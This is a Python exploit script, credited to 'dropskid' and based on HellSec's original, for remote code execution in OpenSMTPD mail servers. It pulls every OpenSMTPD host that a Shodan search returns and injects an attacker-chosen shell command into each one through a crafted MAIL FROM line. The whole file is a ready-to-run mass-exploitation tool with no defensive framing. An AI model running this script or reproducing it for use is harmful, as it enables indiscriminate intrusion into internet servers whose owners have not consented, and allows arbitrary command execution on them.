SHODAN_API_KEY = '' # your shodan.io api key here

BANNER = '''
╔═╗╔═╗╔═╗╔╗╔  ╔═╗╔╦╗╔╦╗╔═╗╔╦╗ 
║ ║╠═╝║╣ ║║║  ╚═╗║║║ ║ ╠═╝ ║║ by dropskid @ https://github.com/dropsql
╚═╝╩  ╚═╝╝╚╝  ╚═╝╩ ╩ ╩ ╩  ═╩╝ original by HellSec @ https://github.com/rpie/OpenSMTPD
OpenSMTPD RCE exploit
'''

import shodan
import asyncio
import argparse

from rich.console import Console

console = Console(log_time_format='(%X)')

console.print(BANNER)

parser = argparse.ArgumentParser(
    usage='%(prog)s [options]'
)

parser.add_argument('-k', '--key', help='Shodan API key', default=SHODAN_API_KEY, required=False, metavar='', dest='shodan_api_key')
parser.add_argument('-p', '--payload', help='Payload to send', default='ls', required=False, metavar='', dest='payload')

args = parser.parse_args()

SHODAN_API_KEY = args.shodan_api_key
PAYLOAD = args.payload

async def receive(reader, buffer=1024, timeout=5.0):
    return await asyncio.wait_for(reader.read(buffer), timeout=timeout)

async def exploit(addr: str, port: int, payload: str, timeout=5.0):
    try:
        # connect to the server
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host=addr, port=port), timeout=timeout)

        # grab server banner
        server_banner = await receive(reader)

        # check is the server is running OpenSMTPD
        if not b'OpenSMTPD' in server_banner:
            return

        writer.write(b'HELO x\r\n')
        
        response = await receive(reader)

        if not b'250' in response:
            return

        # execute payload
        exploit_data = b'MAIL FROM:<;%b;>\r\n' % payload.encode()
        writer.write(exploit_data)

        response = await receive(reader)

        if not b'250' in response:
            return

        datas = [
            b'RCPT TO:<root>\r\n',
            b'DATA\r\n',
            b'\r\nxxx\r\n.\r\n',
            b'QUIT\r\n',
        ]
        
        for data in datas:
            writer.write(data)
            response = await receive(reader)

        console.log(f'{"%s:%d" % (addr, port):<21}[white]([green]success: payload executed[/green])[/white]')

    except:
        return

loop = asyncio.get_event_loop()

client = shodan.Shodan(key=SHODAN_API_KEY)

console.log('gathering targets...')
search_result = client.search('OpenSMTPD')

targets = [(match['ip_str'], match['port']) for match in search_result['matches']]
tasks = []

console.log('scraped %d ips and ports' % len(targets))


for addr, port in targets:
    tasks.append(exploit(addr, port, PAYLOAD))

loop.run_until_complete(asyncio.wait(tasks))